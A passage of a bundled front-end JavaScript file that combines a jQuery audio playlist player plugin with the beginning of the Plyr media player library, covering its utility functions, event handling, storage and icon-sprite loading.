/* streamcast */
/* musicplayer-min.js */
!(function (t, e, s, i) {
  "use strict";
  var n = "musicPlayer",
    o = {
      playlistItemSelector: "li",
      autoPlay: !1,
      volume: 80,
      loop: !1,
      timeSeparator: " / ",
      playerAbovePlaylist: !0,
      infoElements: ["title", "artist"],
      elements: [
        "artwork",
        "information",
        "controls",
        "progress",
        "time",
        "volume",
      ],
      timeElements: ["current", "duration"],
      controlElements: ["backward", "play", "forward", "stop"],
      onLoad: function () {},
      onPlay: function () {},
      onPause: function () {},
      onStop: function () {},
      onFwd: function () {},
      onRew: function () {},
      volumeChanged: function () {},
      seeked: function () {},
      trackClicked: function () {},
      onMute: function () {},
    },
    l = "ontouchstart" in e,
    a = l ? "touchstart" : "mousedown",
    r = l ? "touchmove" : "mousemove",
    d = l ? "touchcancel" : "mouseup";
  function u(e, s) {
    (this.element = e),
      (this.settings = t.extend({}, o, s)),
      (this._defaults = o),
      (this._name = n),
      this.init();
  }
  t.extend(u.prototype, {
    init: function () {
      var e,
        s = "",
        i = "",
        n = "",
        o = "",
        l = "",
        a = "",
        r = "",
        d = "",
        u = "",
        h = "",
        c = "",
        m = "",
        v = "",
        f = this;
      for (var p in this.settings.elements)
        if ("volume" == this.settings.elements[p])
          o +=
            "<div class='volume'><div class='volume-btn' title='Volume'></div><div class=' volume-adjust'><div><div></div></div></div></div>";
        else if ("progress" == this.settings.elements[p])
          o +=
            "<div class='progressbar'><div class='bar-loaded' ></div><div class='bar-played'></div></div>";
        else if ("artwork" == this.settings.elements[p])
          o += "<div class='cover'></div>";
        else if ("information" == this.settings.elements[p]) {
          (l =
            "-1" != t.inArray("title", this.settings.infoElements)
              ? "<div class='title'></div>"
              : " "),
            (a =
              "-1" != t.inArray("artist", this.settings.infoElements)
                ? "<div class='artist'></div>"
                : " ");
          for (var g in this.settings.infoElements)
            "title" == this.settings.infoElements[g]
              ? (n += l)
              : "artist" == this.settings.infoElements[g] && (n += a);
          o += "<div class='info' >" + n + "</div>";
        } else if ("time" == this.settings.elements[p]) {
          (c =
            "-1" != t.inArray("current", this.settings.timeElements)
              ? "<div class='time-current'></div>"
              : " "),
            (m =
              "-1" != t.inArray("duration", this.settings.timeElements)
                ? "<div class='time-duration'></div>"
                : " "),
            (v =
              "<div class='time-separator'>" +
              this.settings.timeSeparator.replace(/\s/g, "&nbsp;") +
              "</div>");
          for (var g in this.settings.timeElements)
            1 == g && (i += v),
              "current" == this.settings.timeElements[g]
                ? (i += c)
                : "duration" == this.settings.timeElements[g] && (i += m);
          o += "<div class='timeHolder'>" + i + "</div>";
        } else if ("controls" == this.settings.elements[p]) {
          (r =
            "-1" != t.inArray("backward", this.settings.controlElements)
              ? "<div class='rew'></div>"
              : " "),
            (d =
              "-1" != t.inArray("forward", this.settings.controlElements)
                ? "<div class='fwd'></div>"
                : " "),
            (u =
              "-1" != t.inArray("stop", this.settings.controlElements)
                ? "<div class='stop'></div>"
                : " "),
            (h =
              "-1" != t.inArray("play", this.settings.controlElements)
                ? "<div class='play'></div><div class='pause'></div>"
                : " ");
          for (var g in this.settings.controlElements)
            "backward" == this.settings.controlElements[g]
              ? (s += r)
              : "play" == this.settings.controlElements[g]
              ? (s += h)
              : "forward" == this.settings.controlElements[g]
              ? (s += d)
              : "stop" == this.settings.controlElements[g] && (s += u);
          o += "<div class='controls'>" + s + "</div>";
        }
      (e = t("<div class='player' >" + o + "</div>")),
        this.settings.playerAbovePlaylist
          ? t(e).insertBefore(t(this.element).find(".playlist"))
          : t(e).insertAfter(t(this.element).find(".playlist")),
        (this.playlistItemSelector = this.settings.playlistItemSelector),
        (this.playlistHolder = t(this.element).children(".playlist")),
        (this.playerHolder = t(this.element).children(".player")),
        (this.song = ""),
        (this.theBar = this.playerHolder.find(".progressbar")),
        (this.barPlayed = this.playerHolder.find(".bar-played")),
        (this.barLoaded = this.playerHolder.find(".bar-loaded")),
        (this.timeCurrent = this.playerHolder.find(".time-current")),
        (this.timeDuration = this.playerHolder.find(".time-duration")),
        (this.timeSeparator = this.settings.timeSeparator),
        (this.volumeInfo = this.playerHolder.find(".volume")),
        (this.volumeButton = this.playerHolder.find(".volume-btn")),
        (this.volumeAdjuster = this.playerHolder.find(".volume-adjust > div")),
        (this.volumeValue = this.settings.volume / 100),
        (this.volumeDefault = 0),
        (this.trackInfo = this.playerHolder.find(".info")),
        (this.coverInfo = this.playerHolder.find(".cover")),
        (this.controlsInfo = this.playerHolder.find(".controls")),
        (this.controlPlay = t(this.controlsInfo).find(".play")),
        (this.controlPause = t(this.controlsInfo).find(".pause")),
        (this.controlStop = t(this.controlsInfo).find(".stop")),
        (this.controlFwd = t(this.controlsInfo).find(".fwd")),
        (this.controlRew = t(this.controlsInfo).find(".rew")),
        (this.cssClass = { playing: "playing", mute: "mute" }),
        /iPad|iPhone|iPod/.test(navigator.userAgent) &&
          t(this.volumeInfo).hide(),
        this.initAudio(
          t(this.playlistHolder.find(this.playlistItemSelector + ":first"))
        ),
        (this.song.volume = this.volumeValue),
        this.timeDuration.html("&hellip;"),
        this.timeCurrent.text(this.secondsToTime(0)),
        t(this.controlPlay).click(function (t) {
          t.preventDefault(), f.playAudio();
        }),
        t(this.controlPause).click(function (t) {
          t.preventDefault(), f.stopAudio(), f.settings.onPause();
        }),
        t(this.controlFwd).click(function (e) {
          e.preventDefault(), f.stopAudio();
          var s = f.getSong(!0);
          0 == s.length &&
            (s = t(f.playlistHolder).find(f.playlistItemSelector + ":first")),
            f.loadNewSong(s),
            f.playAudio(),
            f.settings.onFwd();
        }),
        t(this.controlRew).click(function (e) {
          e.preventDefault(), f.stopAudio();
          var s = f.getSong(!1);
          0 == s.length &&
            (s = t(f.playlistHolder).find(f.playlistItemSelector + ":last")),
            f.loadNewSong(s),
            f.playAudio(),
            f.settings.onRew();
        }),
        t(this.controlStop).click(function (t) {
          t.preventDefault(),
            f.stopAudio(),
            (f.song.currentTime = 0),
            f.settings.onStop();
        }),
        t(this.playlistHolder)
          .find(this.playlistItemSelector)
          .click(function (e) {
            e.preventDefault(),
              f.stopAudio(),
              f.loadNewSong(t(this)),
              f.playAudio(),
              f.settings.trackClicked();
          });
    },
    secondsToTime: function (t) {
      var e = Math.floor(t / 3600),
        s = Math.floor((t % 3600) / 60),
        i = Math.ceil((t % 3600) % 60);
      return (
        (0 == e
          ? ""
          : e > 0 && e.toString().length < 2
          ? "0" + e + ":"
          : e + ":") +
        (s.toString().length < 2 ? "0" + s : s) +
        ":" +
        (i.toString().length < 2 ? "0" + i : i)
      );
    },
    adjustVolume: function (t) {
      var e = l ? t.originalEvent.touches[0] : t;
      this.song.volume = Math.abs(
        (e.pageX - this.volumeAdjuster.offset().left) /
          this.volumeAdjuster.width()
      );
    },
    adjustCurrentTime: function (t) {
      var e = l ? t.originalEvent.touches[0] : t;
      this.song.currentTime = Math.round(
        (this.song.duration * (e.pageX - this.theBar.offset().left)) /
          this.theBar.width()
      );
    },
    initAudio: function (e) {
      var s = e.children("a:first-child").attr("href"),
        i = e.text(),
        n = e.attr("data-cover"),
        o = e.attr("data-artist"),
        l = this;
      t(this.trackInfo).children(".title").text(i),
        t(this.trackInfo).children(".artist").text(o),
        t(this.coverInfo).css("background-image", "url(" + n + ")"),
        (this.song = new Audio(s)),
        this.song.load(),
        this.song.addEventListener(
          "loadeddata",
          function () {
            t(l.timeDuration).html(l.secondsToTime(this.duration)),
              t(l.volumeAdjuster)
                .find("div")
                .width(100 * this.volume + "%"),
              (l.volumeDefault = this.volume);
          },
          !1
        ),
        this.song.addEventListener("progress", function () {
          t(l.barLoaded).width(
            (this.buffered.end(0) / this.duration) * 100 + "%"
          );
        }),
        this.song.addEventListener("timeupdate", function () {
          t(l.timeCurrent).text(l.secondsToTime(this.currentTime)),
            t(l.barPlayed).width(
              (this.currentTime / this.duration) * 100 + "%"
            );
        }),
        this.song.addEventListener("volumechange", function () {
          Number(Math.round(100 * this.volume + "e1") + "e-1") <= 0.4 &&
            (this.volume = 0),
            t(l.volumeAdjuster)
              .find("div")
              .width(100 * this.volume + "%"),
            this.volume > 0 &&
              l.playerHolder.hasClass(l.cssClass.mute) &&
              l.playerHolder.removeClass(l.cssClass.mute),
            this.volume <= 0 &&
              !l.playerHolder.hasClass(l.cssClass.mute) &&
              l.playerHolder.addClass(l.cssClass.mute),
            (l.volumeValue = this.volume);
        }),
        this.song.addEventListener("ended", function () {
          l.settings.autoPlay
            ? l.autoPlayNext()
            : (l.playerHolder.removeClass(l.cssClass.playing),
              t(l.controlPlay).removeClass("hidden"),
              t(l.controlPause).removeClass("visible"));
        }),
        t(this.volumeButton).on("click", function () {
          return (
            t(l.playerHolder).hasClass(l.cssClass.mute)
              ? (t(l.playerHolder).removeClass(l.cssClass.mute),
                (l.song.volume = l.volumeDefault))
              : (t(l.playerHolder).addClass(l.cssClass.mute),
                (l.volumeDefault = l.song.volume),
                (l.song.volume = 0),
                l.settings.onMute()),
            !1
          );
        }),
        t(this.volumeAdjuster)
          .on(a, function (t) {
            l.adjustVolume(t),
              l.volumeAdjuster.on(r, function (t) {
                l.adjustVolume(t);
              }),
              l.settings.volumeChanged();
          })
          .on(d, function () {
            l.volumeAdjuster.unbind(r);
          }),
        t(this.theBar)
          .on(a, function (t) {
            l.adjustCurrentTime(t),
              l.theBar.on(r, function (t) {
                l.adjustCurrentTime(t);
              });
          })
          .on(d, function () {
            l.theBar.unbind(r), l.settings.seeked();
          }),
        t(this.playlistHolder)
          .find(l.playlistItemSelector)
          .removeClass("active"),
        e.addClass("active"),
        this.settings.onLoad(),
        this.settings.autoPlay && this.playAudio();
    },
    playAudio: function () {
      this.song.play(),
        this.playerHolder.addClass(this.cssClass.playing),
        "-1" != t.inArray("controls", this.settings.elements) &&
          "-1" != t.inArray("play", this.settings.controlElements) &&
          (t(this.controlPlay).addClass("hidden"),
          t(this.controlPause).addClass("visible")),
        this.settings.onPlay();
    },
    stopAudio: function () {
      this.song.pause(),
        this.playerHolder.removeClass(this.cssClass.playing),
        "-1" != t.inArray("controls", this.settings.elements) &&
          "-1" != t.inArray("play", this.settings.controlElements) &&
          (t(this.controlPlay).removeClass("hidden"),
          t(this.controlPause).removeClass("visible"));
    },
    autoPlayNext: function () {
      this.stopAudio();
      var e = this.getSong(!0);
      0 == e.length && this.settings.loop
        ? ((e = t(this.playlistHolder).find(
            this.playlistItemSelector + ":first"
          )),
          this.loadNewSong(e),
          this.playAudio())
        : 0 == !e.length && (this.loadNewSong(e), this.playAudio());
    },
    getSong: function (e) {
      var s = t(this.playlistHolder).find(this.playlistItemSelector),
        i = t(this.playlistItemSelector + ".active");
      return e ? s.eq(s.index(i) + 1) : s.eq(s.index(i) - 1);
    },
    loadNewSong: function (t) {
      (this.volumeValue = this.song.volume),
        this.initAudio(t),
        (this.song.volume = this.volumeValue),
        this.volumeAdjuster.find("div").width(100 * this.volumeValue + "%"),
        this.barPlayed.width(0),
        this.barLoaded.width(0);
    },
  }),
    (t.fn[n] = function (e) {
      return this.each(function () {
        t.data(this, "plugin_" + n) ||
          t.data(this, "plugin_" + n, new u(this, e));
      });
    });
})(jQuery, window, document);

/* plyr.js */
"object" == typeof navigator &&
  (function (e, t) {
    "object" == typeof exports && "undefined" != typeof module
      ? (module.exports = t())
      : "function" == typeof define && define.amd
      ? define("Plyr", t)
      : (e.Plyr = t());
  })(this, function () {
    "use strict";
    function e(e, t) {
      if (!(e instanceof t))
        throw new TypeError("Cannot call a class as a function");
    }
    function t(e, t) {
      for (var n = 0; n < t.length; n++) {
        var i = t[n];
        (i.enumerable = i.enumerable || !1),
          (i.configurable = !0),
          "value" in i && (i.writable = !0),
          Object.defineProperty(e, i.key, i);
      }
    }
    function n(e, n, i) {
      return n && t(e.prototype, n), i && t(e, i), e;
    }
    function i(e, t, n) {
      return (
        t in e
          ? Object.defineProperty(e, t, {
              value: n,
              enumerable: !0,
              configurable: !0,
              writable: !0,
            })
          : (e[t] = n),
        e
      );
    }
    function a(e, t) {
      return (
        (function (e) {
          if (Array.isArray(e)) return e;
        })(e) ||
        (function (e, t) {
          var n = [],
            i = !0,
            a = !1,
            s = void 0;
          try {
            for (
              var o, r = e[Symbol.iterator]();
              !(i = (o = r.next()).done) &&
              (n.push(o.value), !t || n.length !== t);
              i = !0
            );
          } catch (e) {
            (a = !0), (s = e);
          } finally {
            try {
              i || null == r.return || r.return();
            } finally {
              if (a) throw s;
            }
          }
          return n;
        })(e, t) ||
        (function () {
          throw new TypeError(
            "Invalid attempt to destructure non-iterable instance"
          );
        })()
      );
    }
    function s(e) {
      return (
        (function (e) {
          if (Array.isArray(e)) {
            for (var t = 0, n = new Array(e.length); t < e.length; t++)
              n[t] = e[t];
            return n;
          }
        })(e) ||
        (function (e) {
          if (
            Symbol.iterator in Object(e) ||
            "[object Arguments]" === Object.prototype.toString.call(e)
          )
            return Array.from(e);
        })(e) ||
        (function () {
          throw new TypeError(
            "Invalid attempt to spread non-iterable instance"
          );
        })()
      );
    }
    var o = function (e) {
        return null != e ? e.constructor : null;
      },
      r = function (e, t) {
        return Boolean(e && t && e instanceof t);
      },
      l = function (e) {
        return null == e;
      },
      c = function (e) {
        return o(e) === Object;
      },
      u = function (e) {
        return o(e) === String;
      },
      d = function (e) {
        return Array.isArray(e);
      },
      h = function (e) {
        return r(e, NodeList);
      },
      p = function (e) {
        return (
          l(e) ||
          ((u(e) || d(e) || h(e)) && !e.length) ||
          (c(e) && !Object.keys(e).length)
        );
      },
      m = {
        nullOrUndefined: l,
        object: c,
        number: function (e) {
          return o(e) === Number && !Number.isNaN(e);
        },
        string: u,
        boolean: function (e) {
          return o(e) === Boolean;
        },
        function: function (e) {
          return o(e) === Function;
        },
        array: d,
        weakMap: function (e) {
          return r(e, WeakMap);
        },
        nodeList: h,
        element: function (e) {
          return r(e, Element);
        },
        textNode: function (e) {
          return o(e) === Text;
        },
        event: function (e) {
          return r(e, Event);
        },
        keyboardEvent: function (e) {
          return r(e, KeyboardEvent);
        },
        cue: function (e) {
          return r(e, window.TextTrackCue) || r(e, window.VTTCue);
        },
        track: function (e) {
          return r(e, TextTrack) || (!l(e) && u(e.kind));
        },
        url: function (e) {
          if (r(e, window.URL)) return !0;
          if (!u(e)) return !1;
          var t = e;
          (e.startsWith("http://") && e.startsWith("https://")) ||
            (t = "http://".concat(e));
          try {
            return !p(new URL(t).hostname);
          } catch (e) {
            return !1;
          }
        },
        empty: p,
      },
      f = (function () {
        var e = !1;
        try {
          var t = Object.defineProperty({}, "passive", {
            get: function () {
              return (e = !0), null;
            },
          });
          window.addEventListener("test", null, t),
            window.removeEventListener("test", null, t);
        } catch (e) {}
        return e;
      })();
    function g(e, t, n) {
      var i = this,
        a = arguments.length > 3 && void 0 !== arguments[3] && arguments[3],
        s = !(arguments.length > 4 && void 0 !== arguments[4]) || arguments[4],
        o = arguments.length > 5 && void 0 !== arguments[5] && arguments[5];
      if (e && "addEventListener" in e && !m.empty(t) && m.function(n)) {
        var r = t.split(" "),
          l = o;
        f && (l = { passive: s, capture: o }),
          r.forEach(function (t) {
            i &&
              i.eventListeners &&
              a &&
              i.eventListeners.push({
                element: e,
                type: t,
                callback: n,
                options: l,
              }),
              e[a ? "addEventListener" : "removeEventListener"](t, n, l);
          });
      }
    }
    function y(e) {
      var t =
          arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "",
        n = arguments.length > 2 ? arguments[2] : void 0,
        i = !(arguments.length > 3 && void 0 !== arguments[3]) || arguments[3],
        a = arguments.length > 4 && void 0 !== arguments[4] && arguments[4];
      g.call(this, e, t, n, !0, i, a);
    }
    function v(e) {
      var t =
          arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "",
        n = arguments.length > 2 ? arguments[2] : void 0,
        i = !(arguments.length > 3 && void 0 !== arguments[3]) || arguments[3],
        a = arguments.length > 4 && void 0 !== arguments[4] && arguments[4];
      g.call(this, e, t, n, !1, i, a);
    }
    function b(e) {
      var t =
          arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "",
        n = arguments.length > 2 ? arguments[2] : void 0,
        i = !(arguments.length > 3 && void 0 !== arguments[3]) || arguments[3],
        a = arguments.length > 4 && void 0 !== arguments[4] && arguments[4];
      g.call(
        this,
        e,
        t,
        function s() {
          v(e, t, s, i, a);
          for (var o = arguments.length, r = new Array(o), l = 0; l < o; l++)
            r[l] = arguments[l];
          n.apply(this, r);
        },
        !0,
        i,
        a
      );
    }
    function k(e) {
      var t =
          arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "",
        n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
        i = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
      if (m.element(e) && !m.empty(t)) {
        var a = new CustomEvent(t, {
          bubbles: n,
          detail: Object.assign({}, i, { plyr: this }),
        });
        e.dispatchEvent(a);
      }
    }
    function w(e, t) {
      var n = e.length ? e : [e];
      Array.from(n)
        .reverse()
        .forEach(function (e, n) {
          var i = n > 0 ? t.cloneNode(!0) : t,
            a = e.parentNode,
            s = e.nextSibling;
          i.appendChild(e), s ? a.insertBefore(i, s) : a.appendChild(i);
        });
    }
    function T(e, t) {
      m.element(e) &&
        !m.empty(t) &&
        Object.entries(t)
          .filter(function (e) {
            var t = a(e, 2)[1];
            return !m.nullOrUndefined(t);
          })
          .forEach(function (t) {
            var n = a(t, 2),
              i = n[0],
              s = n[1];
            return e.setAttribute(i, s);
          });
    }
    function A(e, t, n) {
      var i = document.createElement(e);
      return m.object(t) && T(i, t), m.string(n) && (i.innerText = n), i;
    }
    function E(e, t, n, i) {
      m.element(t) && t.appendChild(A(e, n, i));
    }
    function P(e) {
      m.nodeList(e) || m.array(e)
        ? Array.from(e).forEach(P)
        : m.element(e) &&
          m.element(e.parentNode) &&
          e.parentNode.removeChild(e);
    }
    function C(e) {
      if (m.element(e))
        for (var t = e.childNodes.length; t > 0; )
          e.removeChild(e.lastChild), (t -= 1);
    }
    function S(e, t) {
      return m.element(t) && m.element(t.parentNode) && m.element(e)
        ? (t.parentNode.replaceChild(e, t), e)
        : null;
    }
    function M(e, t) {
      if (!m.string(e) || m.empty(e)) return {};
      var n = {},
        i = t;
      return (
        e.split(",").forEach(function (e) {
          var t = e.trim(),
            a = t.replace(".", ""),
            s = t.replace(/[[\]]/g, "").split("="),
            o = s[0],
            r = s.length > 1 ? s[1].replace(/["']/g, "") : "";
          switch (t.charAt(0)) {
            case ".":
              m.object(i) && m.string(i.class) && (i.class += " ".concat(a)),
                (n.class = a);
              break;
            case "#":
              n.id = t.replace("#", "");
              break;
            case "[":
              n[o] = r;
          }
        }),
        n
      );
    }
    function N(e, t) {
      if (m.element(e)) {
        var n = t;
        m.boolean(n) || (n = !e.hidden),
          n ? e.setAttribute("hidden", "") : e.removeAttribute("hidden");
      }
    }
    function L(e, t, n) {
      if (m.nodeList(e))
        return Array.from(e).map(function (e) {
          return L(e, t, n);
        });
      if (m.element(e)) {
        var i = "toggle";
        return (
          void 0 !== n && (i = n ? "add" : "remove"),
          e.classList[i](t),
          e.classList.contains(t)
        );
      }
      return !1;
    }
    function x(e, t) {
      return m.element(e) && e.classList.contains(t);
    }
    function I(e, t) {
      return function () {
        return Array.from(document.querySelectorAll(t)).includes(this);
      }.call(e, t);
    }
    function _(e) {
      return this.elements.container.querySelectorAll(e);
    }
    function j(e) {
      return this.elements.container.querySelector(e);
    }
    function O() {
      var e =
          arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : null,
        t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
      m.element(e) &&
        (e.focus({ preventScroll: !0 }),
        t && L(e, this.config.classNames.tabFocus));
    }
    var q,
      R,
      B,
      D =
        ((q = document.createElement("span")),
        (R = {
          WebkitTransition: "webkitTransitionEnd",
          MozTransition: "transitionend",
          OTransition: "oTransitionEnd otransitionend",
          transition: "transitionend",
        }),
        (B = Object.keys(R).find(function (e) {
          return void 0 !== q.style[e];
        })),
        !!m.string(B) && R[B]);
    function H(e) {
      setTimeout(function () {
        try {
          N(e, !0), e.offsetHeight, N(e, !1);
        } catch (e) {}
      }, 0);
    }
    var V,
      F = {
        isIE: !!document.documentMode,
        isWebkit:
          "WebkitAppearance" in document.documentElement.style &&
          !/Edge/.test(navigator.userAgent),
        isIPhone: /(iPhone|iPod)/gi.test(navigator.platform),
        isIos: /(iPad|iPhone|iPod)/gi.test(navigator.platform),
      },
      U = {
        "audio/ogg": "vorbis",
        "audio/wav": "1",
        "video/webm": "vp8, vorbis",
        "video/mp4": "avc1.42E01E, mp4a.40.2",
        "video/ogg": "theora",
      },
      W = {
        audio: "canPlayType" in document.createElement("audio"),
        video: "canPlayType" in document.createElement("video"),
        check: function (e, t, n) {
          var i = F.isIPhone && n && W.playsinline,
            a = W[e] || "html5" !== t;
          return {
            api: a,
            ui: a && W.rangeInput && ("video" !== e || !F.isIPhone || i),
          };
        },
        pip: !(
          F.isIPhone ||
          (!m.function(A("video").webkitSetPresentationMode) &&
            (!document.pictureInPictureEnabled ||
              A("video").disablePictureInPicture))
        ),
        airplay: m.function(window.WebKitPlaybackTargetAvailabilityEvent),
        playsinline: "playsInline" in document.createElement("video"),
        mime: function (e) {
          var t = a(e.split("/"), 1)[0],
            n = e;
          if (!this.isHTML5 || t !== this.type) return !1;
          Object.keys(U).includes(n) && (n += '; codecs="'.concat(U[e], '"'));
          try {
            return Boolean(n && this.media.canPlayType(n).replace(/no/, ""));
          } catch (e) {
            return !1;
          }
        },
        textTracks: "textTracks" in document.createElement("video"),
        rangeInput:
          ((V = document.createElement("input")),
          (V.type = "range"),
          "range" === V.type),
        touch: "ontouchstart" in document.documentElement,
        transitions: !1 !== D,
        reducedMotion:
          "matchMedia" in window &&
          window.matchMedia("(prefers-reduced-motion)").matches,
      },
      z = {
        getSources: function () {
          var e = this;
          return this.isHTML5
            ? Array.from(this.media.querySelectorAll("source")).filter(
                function (t) {
                  return W.mime.call(e, t.getAttribute("type"));
                }
              )
            : [];
        },
        getQualityOptions: function () {
          return z.getSources
            .call(this)
            .map(function (e) {
              return Number(e.getAttribute("size"));
            })
            .filter(Boolean);
        },
        extend: function () {
          if (this.isHTML5) {
            var e = this;
            Object.defineProperty(e.media, "quality", {
              get: function () {
                var t = z.getSources.call(e).find(function (t) {
                  return t.getAttribute("src") === e.source;
                });
                return t && Number(t.getAttribute("size"));
              },
              set: function (t) {
                var n = z.getSources.call(e).find(function (e) {
                  return Number(e.getAttribute("size")) === t;
                });
                if (n) {
                  var i = e.media,
                    a = i.currentTime,
                    s = i.paused,
                    o = i.preload,
                    r = i.readyState;
                  (e.media.src = n.getAttribute("src")),
                    ("none" !== o || r) &&
                      (e.once("loadedmetadata", function () {
                        (e.currentTime = a), s || e.play();
                      }),
                      e.media.load()),
                    k.call(e, e.media, "qualitychange", !1, { quality: t });
                }
              },
            });
          }
        },
        cancelRequests: function () {
          this.isHTML5 &&
            (P(z.getSources.call(this)),
            this.media.setAttribute("src", this.config.blankVideo),
            this.media.load(),
            this.debug.log("Cancelled network requests"));
        },
      };
    function K(e) {
      return m.array(e)
        ? e.filter(function (t, n) {
            return e.indexOf(t) === n;
          })
        : e;
    }
    function Y(e, t) {
      return t.split(".").reduce(function (e, t) {
        return e && e[t];
      }, e);
    }
    function J() {
      for (
        var e =
            arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
          t = arguments.length,
          n = new Array(t > 1 ? t - 1 : 0),
          a = 1;
        a < t;
        a++
      )
        n[a - 1] = arguments[a];
      if (!n.length) return e;
      var s = n.shift();
      return m.object(s)
        ? (Object.keys(s).forEach(function (t) {
            m.object(s[t])
              ? (Object.keys(e).includes(t) || Object.assign(e, i({}, t, {})),
                J(e[t], s[t]))
              : Object.assign(e, i({}, t, s[t]));
          }),
          J.apply(void 0, [e].concat(n)))
        : e;
    }
    function Q(e) {
      for (
        var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), i = 1;
        i < t;
        i++
      )
        n[i - 1] = arguments[i];
      return m.empty(e)
        ? e
        : e.toString().replace(/{(\d+)}/g, function (e, t) {
            return n[t].toString();
          });
    }
    function $() {
      var e =
          arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "",
        t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "",
        n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "";
      return e.replace(
        new RegExp(
          t.toString().replace(/([.*+?^=!:${}()|[\]\/\\])/g, "\\$1"),
          "g"
        ),
        n.toString()
      );
    }
    function G() {
      return (
        arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : ""
      )
        .toString()
        .replace(/\w\S*/g, function (e) {
          return e.charAt(0).toUpperCase() + e.substr(1).toLowerCase();
        });
    }
    function X() {
      var e = (
        arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : ""
      ).toString();
      return (
        (e = (function () {
          var e = (
            arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : ""
          ).toString();
          return (
            (e = $(e, "-", " ")), (e = $(e, "_", " ")), $((e = G(e)), " ", "")
          );
        })(e))
          .charAt(0)
          .toLowerCase() + e.slice(1)
      );
    }
    function Z(e) {
      var t = document.createElement("div");
      return t.appendChild(e), t.innerHTML;
    }
    var ee = {
        pip: "PIP",
        airplay: "AirPlay",
        html5: "HTML5",
        vimeo: "Vimeo",
        youtube: "YouTube",
      },
      te = function () {
        var e =
            arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "",
          t =
            arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
        if (m.empty(e) || m.empty(t)) return "";
        var n = Y(t.i18n, e);
        if (m.empty(n)) return Object.keys(ee).includes(e) ? ee[e] : "";
        var i = { "{seektime}": t.seekTime, "{title}": t.title };
        return (
          Object.entries(i).forEach(function (e) {
            var t = a(e, 2),
              i = t[0],
              s = t[1];
            n = $(n, i, s);
          }),
          n
        );
      },
      ne = (function () {
        function t(n) {
          e(this, t),
            (this.enabled = n.config.storage.enabled),
            (this.key = n.config.storage.key);
        }
        return (
          n(
            t,
            [
              {
                key: "get",
                value: function (e) {
                  if (!t.supported || !this.enabled) return null;
                  var n = window.localStorage.getItem(this.key);
                  if (m.empty(n)) return null;
                  var i = JSON.parse(n);
                  return m.string(e) && e.length ? i[e] : i;
                },
              },
              {
                key: "set",
                value: function (e) {
                  if (t.supported && this.enabled && m.object(e)) {
                    var n = this.get();
                    m.empty(n) && (n = {}),
                      J(n, e),
                      window.localStorage.setItem(this.key, JSON.stringify(n));
                  }
                },
              },
            ],
            [
              {
                key: "supported",
                get: function () {
                  try {
                    if (!("localStorage" in window)) return !1;
                    return (
                      window.localStorage.setItem("___test", "___test"),
                      window.localStorage.removeItem("___test"),
                      !0
                    );
                  } catch (e) {
                    return !1;
                  }
                },
              },
            ]
          ),
          t
        );
      })();
    function ie(e) {
      var t =
        arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "text";
      return new Promise(function (n, i) {
        try {
          var a = new XMLHttpRequest();
          if (!("withCredentials" in a)) return;
          a.addEventListener("load", function () {
            if ("text" === t)
              try {
                n(JSON.parse(a.responseText));
              } catch (e) {
                n(a.responseText);
              }
            else n(a.response);
          }),
            a.addEventListener("error", function () {
              throw new Error(a.status);
            }),
            a.open("GET", e, !0),
            (a.responseType = t),
            a.send();
        } catch (e) {
          i(e);
        }
      });
    }
    function ae(e, t) {
      if (m.string(e)) {
        var n = m.string(t),
          i = function () {
            return null !== document.getElementById(t);
          },
          a = function (e, t) {
            (e.innerHTML = t),
              (n && i()) ||
                document.body.insertAdjacentElement("afterbegin", e);
          };
        if (!n || !i()) {
          var s = ne.supported,
            o = document.createElement("div");
          if ((o.setAttribute("hidden", ""), n && o.setAttribute("id", t), s)) {
            var r = window.localStorage.getItem(
              "".concat("cache", "-").concat(t)
            );
            if (null !== r) {
              var l = JSON.parse(r);
              a(o, l.content);
            }
          }
          ie(e)
            .then(function (e) {
              m.empty(e) ||
                (s &&
                  window.localStorage.setItem(
                    "".concat("cache", "-").concat(t),
                    JSON.stringify({ content: e })
                  ),
                a(o, e));
            })
            .catch(function () {});
        }
      }
    }
    var se = function (e) {
        return parseInt((e / 60 / 60) % 60, 10);
      },
      oe = function (e) {
        return parseInt((e / 60) % 60, 10);
      },
      re = function (e) {
        return parseInt(e % 60, 10);
      };
    function le() {
      var e =
          arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0,
        t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
        n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
      if (!m.number(e)) return le(null, t, n);
      var i = function (e) {
          return "0".concat(e).slice(-2);
        },
        a = se(e),
        s = oe(e),
        o = re(e);
      return (
        (a = t || a > 0 ? "".concat(a, ":") : ""),
        ""
          .concat(n && e > 0 ? "-" : "")
          .concat(a)
          .concat(i(s), ":")
          .concat(i(o))
      );
    }
    var ce = {
      getIconUrl: function () {
        var e =
          new URL(this.config.iconUrl, window.location).host !==
            window.location.host ||
          (F.isIE && !window.svg4everybody);
        return { url: this.config.iconUrl, cors: e };
      },
      findElements: function () {
        try {
          return (
            (this.elements.controls = j.call(
              this,
              this.config.selectors.controls.wrapper
            )),
            (this.elements.buttons = {
              play: _.call(this, this.config.selectors.buttons.play),
              pause: j.call(this, this.config.selectors.buttons.pause),
              restart: j.call(this, this.config.selectors.buttons.restart),
              rewind: j.call(this, this.config.selectors.buttons.rewind),
              fastForward: j.call(
                this,
                this.config.selectors.buttons.fastForward
              ),
              mute: j.call(this, this.config.selectors.buttons.mute),
              pip: j.call(this, this.config.selectors.buttons.pip),
              airplay: j.call(this, this.config.selectors.buttons.airplay),
              settings: j.call(this, this.config.selectors.buttons.settings),
